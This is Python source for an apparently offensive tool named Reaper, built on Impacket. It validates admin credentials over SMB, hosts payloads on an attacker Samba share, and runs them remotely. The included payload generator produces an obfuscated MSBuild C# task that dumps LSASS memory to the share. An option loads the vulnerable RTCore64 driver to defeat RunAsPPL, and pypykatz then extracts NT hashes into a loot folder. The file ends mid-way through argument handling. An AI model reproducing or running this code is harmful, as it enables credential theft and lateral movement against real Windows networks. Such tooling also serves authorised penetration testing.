from __future__ import division
from __future__ import print_function
import os
import re
import sys
import cmd
import time
import nmap
import glob
import ntpath
import socket
import random
import string
import logging
import fnmatch
import argparse
import threading
import subprocess
import collections
import socket, errno
import netifaces as ni
from base64 import b64encode
from datetime import datetime
from pebble import ProcessPool
from argparse import RawTextHelpFormatter

from six import PY2
from impacket import version
from impacket import smbserver
from impacket.examples import logger
from impacket.krb5.keytab import Keytab
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import tsch, transport
from impacket.examples.utils import parse_target
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_GSS_NEGOTIATE, RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.smbconnection import SMBConnection, SMB_DIALECT, SMB2_DIALECT_002, SMB2_DIALECT_21

try:
    import ConfigParser
except ImportError:
    import configparser as ConfigParser

from threading import Thread
from impacket import version, smbserver
from impacket.dcerpc.v5 import transport, scmr

BATCH_FILENAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15))) + '.bat'
SERVICE_NAME = ''.join(random.choices(string.ascii_uppercase, k=random.randrange(8, 15)))
OUTPUT_FILENAME = '__' + str(time.time())
CODEC = sys.stdout.encoding
timestamp = str(datetime.fromtimestamp(time.time())).replace(' ', '_')
acct_chk_fail = []  # this list is used to track failed login attempts
acct_chk_valid = []  # this is used to track previously valid accounts

###################COLORS#################
color_RED = '\033[91m'
color_GRE = '\033[92m'
color_YELL = '\033[93m'
color_BLU = '\033[94m'
color_PURP = '\033[35m'
color_reset = '\033[0m'
green_plus = "{}[+]{}".format(color_GRE, color_reset)
red_minus = "{}[-]{}".format(color_RED, color_reset)
gold_plus = "{}[+]{}".format(color_YELL, color_reset)

reaper_banner = """

 ██{}▓{}      ██████  ▄▄▄          ██▀███  {}▓{}█████ ▄▄▄       ██{}▓{}███  {}▓{}█████  ██▀███  
{}▓{}██{}▒    ▒{}██    {}▒ ▒{}████▄       {}▓{}██ {}▒{} ██{}▒▓{}█   ▀{}▒{}████▄    {}▓{}██{}░{}  ██{}▒▓{}█   ▀ {}▓{}██ {}▒{} ██{}▒{}
{}▒{}██{}░    ░ ▓{}██▄   {}▒{}██  ▀█▄     {}▓{}██ {}░{}▄█ {}▒▒{}███  {}▒{}██  ▀█▄  {}▓{}██{}░{} ██{}▓▒▒{}███   {}▓{}██ {}░{}▄█ {}▒{}
{}▒{}██{}░      ▒{}   ██{}▒░{}██▄▄▄▄██    {}▒{}██▀▀█▄  {}▒▓{}█  ▄{}░{}██▄▄▄▄██ {}▒{}██▄█{}▓▒ ▒▒▓{}█  ▄ {}▒{}██▀▀█▄  
{}░{}██████{}▒▒{}██████{}▒▒ ▓{}█   {}▓{}██{}▒   ░{}██{}▓ ▒{}██{}▒░▒{}████{}▒▓{}█   {}▓{}██{}▒▒{}██{}▒ ░  ░░▒{}████{}▒░{}██{}▓ ▒{}██{}▒
░ ▒░▓  ░▒ ▒▓▒ ▒ ░ ▒▒   ▓▒{}█{}░   ░ ▒▓ ░▒▓░░░ ▒░ ░▒▒   ▓▒{}█{}░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
░ ░ ▒  ░░ ░▒  ░ ░  ▒   ▒▒ ░     ░▒ ░ ▒░ ░ ░  ░ ▒   ▒▒ ░░▒ ░      ░ ░  ░  ░▒ ░ ▒░
  ░ ░   ░  ░  ░    ░   ▒        ░░   ░    ░    ░   ▒   ░░          ░     ░░   ░ 
    ░  ░      ░        ░  ░      ░        ░  ░     ░  ░            ░  ░   ░  {}                                                                                   
""".format(color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset,
           color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset, color_BLU, color_reset)

cwd = os.path.abspath(os.path.dirname(__file__))


def lognoprint(logme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(logme + '\n')
        f.close()


def printnlog(printlogme):
    with open('{}/log.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    with open('{}/indivlog.txt'.format(cwd), 'a') as f:
        f.write(printlogme + '\n')
        f.close()

    print(printlogme)

if os.path.isfile('{}/indivlog.txt'.format(cwd)):
    os.system('sudo rm {}/indivlog.txt'.format(cwd))

lognoprint('\n{}{}{}\n'.format(color_PURP, timestamp, color_reset))


def check_accts(username, password, domain, remoteName, remoteHost, hashes=None, aesKey=None, doKerberos=None, kdcHost=None, port=445):
    upasscombo = '{}:{}'.format(username, password)

    nthash = ''
    lmhash = ''
    if hashes is not None:
        lmhash, nthash = hashes.split(':')
        upasscombo = '{}:{}'.format(username, nthash)

    stringbinding = r'ncacn_np:%s[\pipe\svcctl]' % remoteName
    logging.debug('StringBinding %s' % stringbinding)
    rpctransport = transport.DCERPCTransportFactory(stringbinding)
    rpctransport.set_dport(port)
    rpctransport.setRemoteHost(remoteHost)
    if hasattr(rpctransport, 'set_credentials'):
        # This method exists only for selected protocol sequences.
        rpctransport.set_credentials(username, password, domain, lmhash, nthash, aesKey)

    rpctransport.set_kerberos(doKerberos, kdcHost)

    try:
        samr = rpctransport.get_dce_rpc()
        try:
            samr.connect()
        except Exception as e:
            acct_chk_fail.append(username)
            printnlog('{} {} {}'.format(red_minus, upasscombo.ljust(30), str(e)[:str(e).find("(")]))

        s = rpctransport.get_smb_connection()
        s.setTimeout(100000)
        samr.bind(scmr.MSRPC_UUID_SCMR)
        resp = scmr.hROpenSCManagerW(samr)
        scHandle = resp['lpScHandle']
        acct_chk_valid.append(username)
        printnlog('{} {} {}'.format(gold_plus, upasscombo.ljust(30), "Valid Admin Creds"))


    except  (Exception, KeyboardInterrupt) as e:
        if str(e).find("rpc_s_access_denied") != -1 and str(e).find("STATUS_OBJECT_NAME_NOT_FOUND") == -1:
            acct_chk_valid.append(username)
            printnlog('{} {} {}'.format(green_plus, upasscombo.ljust(30), "Valid Creds"))





def gen_payload_exe(share_name, payload_name, addresses_array):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    os.system('sudo cp {}/src/exepayload /var/tmp/{}/{}.exe'.format(cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.exe'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_dllsideload(share_name, addresses_array):
    os.system('sudo cp {}/src/calc /var/tmp/{}/calc.exe'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/calc.exe'.format(share_name))

    os.system('sudo cp {}/src/WindowsCodecs /var/tmp/{}/WindowsCodecs.dll'.format(cwd, share_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/WindowsCodecs.dll'.format(share_name))

    with open('/var/tmp/{}/address.txt'.format(share_name), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()


def gen_payload_regsvr32(share_name, payload_name, addresses_array):
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    os.system('sudo cp {}/src/regsvr32payload /var/tmp/{}/{}.dll'.format(cwd, share_name, payload_name))
    os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, payload_name))

    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    return addresses_file


def gen_payload_msbuild(share_name, payload_name, drive_letter, addresses_array, runasppl):
    targetname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    taskname = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithDataSegs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithFullMemory = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithHandleData = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithThreadInfo = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    MiniDumpWithTokenInformation = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    filename = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    fs = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    bRet = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    dumpTyp = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    prochandle = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    procid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    Dump = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetMyPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocesses = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myprocess = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    myid = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    GetPID = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    processes = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    id = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    process = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    IsAdministrator = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(6, 25)))
    p = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    l = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    s = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    a = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    lines = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    RunAsPPLDll = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    addresses_file = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ipEntry = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    ip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    i = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))
    thismachinesip = ''.join(random.choices(string.ascii_lowercase, k=random.randrange(8, 25)))

    xml_payload = "<Project ToolsVersion=\"4.0\" xmlns=\"http://schemas.microsoft.com/developer/msbuild/2003\">\n"
    xml_payload += "<!-- C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe SimpleTasks.csproj -->\n"
    xml_payload += "	<Target Name=\"%s\">\n" % (targetname)
    xml_payload += "            <%s />\n" % (taskname)
    xml_payload += "          </Target>\n"
    xml_payload += "          <UsingTask\n"
    xml_payload += "            TaskName=\"%s\"\n" % (taskname)
    xml_payload += "            TaskFactory=\"CodeTaskFactory\"\n"
    xml_payload += "            AssemblyFile=\"C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll\" >\n"
    xml_payload += "            <Task>\n"

    xml_payload += "              <Code Type=\"Class\" Language=\"cs\">\n"
    xml_payload += "              <![CDATA[\n"
    xml_payload += "using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; using System.Threading; using Microsoft.Build.Framework; using Microsoft.Build.Utilities; using System.IO; using System.Linq;\n"
    xml_payload += "public class %s : Task, ITask {\n" % (taskname)
    xml_payload += "		public enum Typ : uint\n"
    xml_payload += "        {\n"
    xml_payload += "            %s = 0x00000001,\n" % (MiniDumpWithDataSegs)
    xml_payload += "            %s = 0x00000002,\n" % (MiniDumpWithFullMemory)
    xml_payload += "            %s = 0x00000004,\n" % (MiniDumpWithHandleData)
    xml_payload += "            %s = 0x00001000,\n" % (MiniDumpWithThreadInfo)
    xml_payload += "            %s = 0x00040000,\n" % (MiniDumpWithTokenInformation)
    xml_payload += "        };\n"
    if runasppl:
        xml_payload += "        [System.Runtime.InteropServices.DllImport(@\"%s:\\\\%s.dll\", EntryPoint = \"runninit\", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]\n" % (drive_letter, RunAsPPLDll)
        xml_payload += "        static extern void runninit(string argus);\n"

    xml_payload += "        [System.Runtime.InteropServices.DllImport(\"dbghelp.dll\",\n"
    xml_payload += "              EntryPoint = \"MiniDumpWriteDump\",\n"
    xml_payload += "              CallingConvention = CallingConvention.StdCall,\n"
    xml_payload += "              CharSet = CharSet.Unicode,\n"
    xml_payload += "              ExactSpelling = true, SetLastError = true)]\n"
    xml_payload += "        static extern bool MiniDumpWriteDump(\n"
    xml_payload += "              IntPtr hProcess,\n"
    xml_payload += "              uint processId,\n"
    xml_payload += "              IntPtr hFile,\n"
    xml_payload += "              uint dumpType,\n"
    xml_payload += "              IntPtr expParam,\n"
    xml_payload += "              IntPtr userStreamParam,\n"
    xml_payload += "              IntPtr callbackParam);\n"

    xml_payload += "        public static bool %s(string %s, Typ %s, IntPtr %s, uint %s)\n" % (Dump, filename, dumpTyp, prochandle, procid)
    xml_payload += "        {\n"
    xml_payload += "            using (var %s = new System.IO.FileStream(%s, System.IO.FileMode.Create, System.IO.FileAccess.Write, System.IO.FileShare.None))\n" % (fs, filename)
    xml_payload += "            {\n"
    xml_payload += "                bool %s = MiniDumpWriteDump(\n" % (bRet)
    xml_payload += "                  %s,\n" % (prochandle)
    xml_payload += "                  %s,\n" % (procid)
    xml_payload += "                  %s.SafeFileHandle.DangerousGetHandle(),\n" % (fs)
    xml_payload += "                  (uint)%s,\n" % (dumpTyp)
    xml_payload += "                  IntPtr.Zero,\n"
    xml_payload += "                  IntPtr.Zero,\n"
    xml_payload += "                  IntPtr.Zero);\n"
    xml_payload += "                if (!%s)\n" % (bRet)
    xml_payload += "                {\n"
    xml_payload += "                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());\n"
    xml_payload += "                }\n"
    xml_payload += "                return %s;\n" % (bRet)
    xml_payload += "            }\n"
    xml_payload += "        }\n"

    xml_payload += "        public static int %s() {\n" % (GetMyPID)
    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ProcessName);\n" % (myprocesses)
    xml_payload += "            var %s = 0;\n" % (myid)
    xml_payload += "            foreach (var %s in %s)\n" % (myprocess, myprocesses)
    xml_payload += "            {\n"
    xml_payload += "                %s = %s.Id;\n" % (myid, myprocess)
    xml_payload += "            }\n"

    xml_payload += "            return %s;\n" % (myid)
    xml_payload += "        }\n"

    xml_payload += "        public static int %s() {\n" % (GetPID)
    xml_payload += "            string %s = \"s\";\n" % (s)
    xml_payload += "            string %s = \"l\";\n" % (l)
    xml_payload += "            string %s = \"a\";\n" % (a)
    xml_payload += "            var %s = System.Diagnostics.Process.GetProcessesByName(%s + %s + %s + %s + %s);\n" % (processes, l, s, a, s, s)
    xml_payload += "            var %s = 0;\n" % (id)
    xml_payload += "            foreach (var %s in %s)\n" % (process, processes)
    xml_payload += "            {\n"
    xml_payload += "                %s = %s.Id;\n" % (id, process)
    xml_payload += "            }\n"

    xml_payload += "            return %s;\n" % (id)
    xml_payload += "        }\n"

    xml_payload += "        public static bool %s()\n" % (IsAdministrator)
    xml_payload += "        {\n"
    xml_payload += "            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))\n"
    xml_payload += "                      .IsInRole(WindowsBuiltInRole.Administrator);\n"
    xml_payload += "        }\n"

    xml_payload += "        public override bool Execute()\n"
    xml_payload += "		{\n"
    xml_payload += "            if (%s())\n" % (IsAdministrator)
    xml_payload += "            {\n"
    xml_payload += "                var %s = System.IO.File.ReadLines(\"%s:\\\\%s.txt\").ToArray();\n" % (lines, drive_letter, addresses_file)
    xml_payload += "                string %s = \"\";\n" % (thismachinesip)
    xml_payload += "                var %s = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());\n" % (ipEntry)
    xml_payload += "                foreach (var %s in %s.AddressList)\n" % (ip, ipEntry)
    xml_payload += "                {\n"
    xml_payload += "                    for (int %s = 0; %s < %s.Length; %s++)\n" % (i, i, lines, i)
    xml_payload += "                    {\n"
    xml_payload += "                        if (%s.ToString() == %s[%s].ToString())\n" % (ip, lines, i)
    xml_payload += "                        {\n"
    xml_payload += "                            %s = \"-\" + %s.ToString();\n" % (thismachinesip, ip)
    xml_payload += "                        }\n"
    xml_payload += "                    }\n"
    xml_payload += "                }\n"
    if runasppl:
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe create RTCore64 type=kernel start=auto binPath=%s:\\\\RTCore64.sys DisplayName=\\\"Micro - Star MSI Afterburner\\\"\").WaitForExit();\n" % (drive_letter)
        xml_payload += "                Thread.Sleep(1000);\n"
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net start RTCore64\").WaitForExit();\n"
        xml_payload += "                Thread.Sleep(1000);\n"
        xml_payload += "                runninit(%s().ToString());\n" % (GetMyPID)
        xml_payload += "                Thread.Sleep(1000);\n"

    xml_payload += "                string filePath = \"%s:\\\\\" + System.Net.Dns.GetHostName() + %s + \".dmp\";\n" % (drive_letter, thismachinesip)
    xml_payload += "                Process %s = Process.GetProcessById(%s());\n" % (p, GetPID)
    xml_payload += "                %s(filePath, (Typ.%s | Typ.%s | Typ.%s | Typ.%s | Typ.%s), %s.Handle, (uint)%s.Id);\n" % (Dump, MiniDumpWithFullMemory, MiniDumpWithDataSegs, MiniDumpWithHandleData, MiniDumpWithThreadInfo, MiniDumpWithTokenInformation, p, p)
    if runasppl:
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"net stop RTCore64\").WaitForExit();\n"
        xml_payload += "                Process.Start(\"cmd.exe\", @\"/c \" + \"sc.exe delete RTCore64\").WaitForExit();\n"

    xml_payload += "            }\n"
    xml_payload += "			return true;\n"
    xml_payload += "        }}\n"
    xml_payload += "                                ]]>\n"
    xml_payload += "                        </Code>\n"
    xml_payload += "                </Task>\n"
    xml_payload += "        </UsingTask>\n"
    xml_payload += "</Project>"

    with open('/var/tmp/{}/{}.xml'.format(share_name, payload_name), 'w') as f:
        f.write(xml_payload)
        f.close()
    with open('/var/tmp/{}/{}.txt'.format(share_name, addresses_file), 'w') as f:
        for addr in addresses_array:
            f.write(addr + "\n")
        f.close()

    if runasppl:
        os.system('sudo cp {}/src/runasppldll /var/tmp/{}/{}.dll'.format(cwd, share_name, RunAsPPLDll))
        os.system('sudo chmod uog+rx /var/tmp/{}/{}.dll'.format(share_name, RunAsPPLDll))

        os.system('sudo cp {}/src/RTCore64.sys /var/tmp/{}/RTCore64.sys'.format(cwd, share_name))
        os.system('sudo chmod uog+rx /var/tmp/{}/RTCore64.sys'.format(share_name))


def setup_share():
    if options.sharename is None:
        share_name = ''.join(random.choices(string.ascii_lowercase, k=20))
    else:
        share_name = options.sharename

    if options.shareuser is None:
        share_user = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_user = options.shareuser

    if options.sharepassword is None:
        share_pass = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase + string.digits, k=35))
    else:
        share_pass = options.sharepassword

    if options.payloadname is None:
        payload_name = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        payload_name = options.payloadname

    if options.sharegroup is None:
        share_group = ''.join(random.choices(string.ascii_lowercase, k=10))
    else:
        share_group = options.sharegroup

    printnlog("\n[Generating share]")
    # making the directory
    printnlog("{} Creating the share folder".format(green_plus))
    os.system("sudo mkdir /var/tmp/" + share_name)

    # smb.conf edits
    data = """[{}]
    path = /var/tmp/{}
    public = no
    force user = {}
    force group = {}
    browseable = yes
    create mask = 0664
    force create mode = 0664
    directory mask = 0775
    force directory mode = 0775
    read only = no
    comment = The share
    """.format(share_name, share_name, share_user, share_group)

    # copy old smb.conf file so its safe
    printnlog("{} Backing up the smb.conf file".format(green_plus))
    os.system("sudo cp /etc/samba/smb.conf " + cwd + "/")
    printnlog("{} Making modifications".format(green_plus))
    with open('/etc/samba/smb.conf', 'a') as f:
        f.write(data)
        f.close()

    # create the user for the share
    # generate the group
    printnlog("{} Creating the group: {}".format(green_plus, share_group))
    os.system("sudo groupadd --system " + share_group)
    # make the user
    print("{} Creating the user: {}".format(green_plus, share_user))
    os.system("sudo useradd --system --no-create-home --group " + share_group + " -s /bin/false " + share_user)
    # give the user access to the share folder
    printnlog("{} Giving the user rights".format(green_plus))
    os.system("sudo chown -R " + share_user + ":" + share_group + " /var/tmp/" + share_name)
    # expand access to the group
    printnlog("{} Giving the group rights".format(green_plus))
    os.system("sudo chmod -R g+w /var/tmp/" + share_name)
    # create the smbusers password
    printnlog("{} Editing the SMB password".format(green_plus))
    proc = subprocess.Popen(['sudo', 'smbpasswd', '-a', '-s', share_user], stdin=subprocess.PIPE)
    proc.communicate(input=share_pass.encode() + '\n'.encode() + share_pass.encode() + '\n'.encode())
    # restart the smb service
    printnlog("{}[+]{} Restarting the SMB service".format(color_BLU, color_reset))
    os.system("sudo systemctl restart smbd")

    return share_name, share_user, share_pass, payload_name, share_group


def alt_exec(command,domain, username, address):
    os.system('sudo proxychains python3 smbexec-shellless.py {}/{}@{} -no-pass \'{}\''.format(domain, username, address,command))

    try:  # move the share file to the loot dir
        os.system("sudo mv /var/tmp/{} {}/loot/{}".format(share_name, cwd, timestamp))
        printnlog('\nLoot dir: {}/loot/{}\n'.format(cwd, timestamp))
    except BaseException as e:
        pass

    if options.ap:  # autoparse
        printnlog("\n[parsing files]")
        os.system("sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt".format(cwd, timestamp, cwd, timestamp))
        os.system("sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep".format(cwd, timestamp, cwd, timestamp))
        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'Window Manage\|Font Driver Host\|\$\|::' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))


    printnlog("\n{}[-]{} Cleaning up please wait".format(color_BLU, color_reset))

    if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
        os.system('sudo rm {}/drives.txt'.format(cwd))

    try:
        os.system("sudo systemctl stop smbd")
        printnlog(green_plus + " Stopped the smbd service")
    except BaseException as e:
        pass

    try:
        os.system("sudo cp " + cwd + "/smb.conf /etc/samba/smb.conf")
        printnlog(green_plus + " Cleaned up the smb.conf file")
    except BaseException as e:
        pass

    try:
        os.system("sudo rm " + cwd + "/smb.conf")
    except BaseException as e:
        pass

    try:
        os.system("sudo userdel " + share_user)
        printnlog(green_plus + " Removed the user: " + share_user)
    except BaseException as e:
        pass

    try:
        os.system("sudo groupdel " + share_group)
        printnlog(green_plus + " Removed the group: " + share_group)
    except BaseException as e:
        pass

    try:
        os.system("sudo mv {}/indivlog.txt {}/loot/{}/log.txt".format(cwd, cwd, timestamp))
    except BaseException as e:
        pass

    print("{}[-]{} Cleanup completed!  If the program does not automatically exit press CTRL + C".format(color_BLU, color_reset))
    exit(0)


def port445_check(interface_ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((interface_ip, 445))
    except socket.error as e:
        if e.errno == errno.EADDRINUSE:
            printnlog("{} Port 445 is already in use".format(red_minus))
            sys.exit(0)
        else:
            # something else raised the socket.error exception
            printnlog(str(e))

    sock.close()

# Process command-line arguments.
if __name__ == '__main__':
    # quick checks to see if were good
    if sys.platform != "linux":
        printnlog("[!] This program is Linux only")
        exit(1)

    if os.path.isdir(cwd + "/loot") == False:
        os.makedirs(cwd + "/loot")

    printnlog(reaper_banner)
    printnlog(version.BANNER)

    parser = argparse.ArgumentParser(add_help=True, description="", epilog='Methods:\n smbexec: Impacket\'s smbexec that has been modified to work a little better it is the most consistent and clean working\n wmiexec: Impacket\'s wmiexec that has been modified to work with Reaper the only artifact it leaves is a dead SMB connection if the payload does not fully execute\n atexec:  Impacket\'s atexec it works sometimes\n\nPayloads:\n  msbuild:     Abuses MsBuild v4.0+\'s ability to run inline tasks via an xml payload to execute C# code\n  regsvr32:    Abuses RegSvr32\'s ability to execute a dll to execute code\n  dllsideload: Abuses Windows 7 calc.exe to sideload a dll to gain code execution\n  exe:         Pretty self explanatory it\'s an exe that runs', formatter_class=RawTextHelpFormatter)

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName, address, range, cidr>')
    parser.add_argument('-share', action='store', default='C$', choices=['C$', 'ADMIN$'], help='share where the output will be grabbed from (default C$ for smbexec, ADMIN$ for wmiexec) (wmiexec and smbexec ONLY)')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-oe', action='store_true', default=False, help='Pause just before the execution of the payload (Good for when you want to execute the payload using other methods)')
    parser.add_argument('-ap', action='store_true', default=False, help='Turn auto parsing of .dmp files ON this will parse the .dmp files into dumped_full.txt, dumped_full_grep.grep, and dumped_msv.txt')
    parser.add_argument('-sh', action='store_true', default=False, help='Skips any hosts that have been previously attacked. (Stored in hist file)')
    parser.add_argument('-drive', action='store', help='Set the drive letter for the remote device to connect with')
    parser.add_argument('-payload', '-p', action='store', default='msbuild', choices=['msbuild', 'regsvr32', 'dllsideload', 'exe'], help='Choose a payload type')
    parser.add_argument('-payloadname', action='store', help='Set the name for the payload file Default=random')
    parser.add_argument('-ip', action='store', help='Your local ip or network interface for the remote device to connect to')
    parser.add_argument('-runasppl', action='store_true', default=False, help='Attempts to bypass RunAsPPL (WARNING THIS USES A SYSTEM DRIVER AND INTERACTS AT A KERNEL LEVEL DO NOT USE IN PROD)')
    parser.add_argument('-codec', action='store', help='Sets encoding used (codec) from the target\'s output (default '
                                                       '"%s"). If errors are detected, run chcp.com at the target, '
                                                       'map the result with '
                                                       'https://docs.python.org/3/library/codecs.html#standard-encodings and then execute wmiexec.py '
                                                       'again with -codec and the corresponding codec ' % CODEC)
    parser.add_argument('-com-version', action='store', metavar="MAJOR_VERSION:MINOR_VERSION", help='DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('-service-name', action='store', metavar="service_name", default=SERVICE_NAME, help='The name of the service used to trigger the payload (SMBEXEC only)')

    parser.add_argument('-sharename', action='store', help='Set the name of the attacker share Default=random')
    parser.add_argument('-shareuser', action='store', help='Set the username of the user for the share Default=random')
    parser.add_argument('-sharepassword', action='store', help='Set the password for shareuser Default=random')
    parser.add_argument('-sharegroup', action='store', help='Set the group for shareuser Default=random')

    group = parser.add_argument_group('authentication')
    group.add_argument('-localauth', action='store_true', default=False, help='Authenticate with a local account to the machine')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH or just NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-A', action="store", metavar="authfile", help="smbclient/mount.cifs-style authentication file. "
                                                                      "See smbclient man page's -A option.")
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    if os.geteuid() != 0:
        printnlog("[!] Must be run as sudo")
        exit(1)

    options = parser.parse_args()

    if options.debug:
        lognoprint('{}Command:{} '.format(color_PURP, color_reset) + ' '.join(sys.argv) + '\n')

    # Init the example's logger theme
    logger.init(options.ts)

    if options.codec is not None:
        CODEC = options.codec
    else:
        if CODEC is None:
            CODEC = 'utf-8'

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    if options.com_version is not None:
        try:
